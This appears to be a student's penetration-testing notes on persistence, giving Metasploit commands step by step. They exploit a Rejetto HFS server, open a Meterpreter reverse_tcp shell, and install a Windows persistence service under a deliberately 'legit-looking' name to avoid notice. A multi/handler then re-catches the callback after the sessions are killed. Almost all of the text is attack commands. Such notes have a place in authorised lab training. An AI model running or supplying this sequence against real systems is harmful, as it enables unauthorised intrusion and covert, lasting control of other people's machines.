### Persistence
* It consists of techniques to keep access to the target across restarts, changed credentials, and other interruptions that could cut off the access.

* PRACTICAL
* Repeat steps till db_nmap --> Look for the vulnerabilities
* `use exploit/windows/http/rejetto_hfs_exec`
* `set payload windows/x64/meterpreter/reverse_tcp`
* `exploit`
* ***
* **Get access without a vulnerable service as the vulnerable services can be removed from the target taking away its access**
* `search platform:windows persistence`
* `use exploit/windows/local/persistence_service`
* `set payload windows/x64/meterpreter/reverse_tcp`
* `set service_name [Legit-looking name to avoid any concerns]`
* `set session [Meterpreter ID]`
* `run`
* Now even if these meterpreter sessions are closed due to some reason, we can set a handler which will keep our access because the persistence we just ran is linked to lhost,i.e, our local IP.
* It will give access everytime the connection  is disrupted
* `sessions -K` --> Kill all the sessions so that we don't have any access
* `use exploit/multi/handler`
* `set lhost`
* `run` --> This will not provide a meterpreter session but a handler to keep the access in case meterpreter is shut  down for some reason.
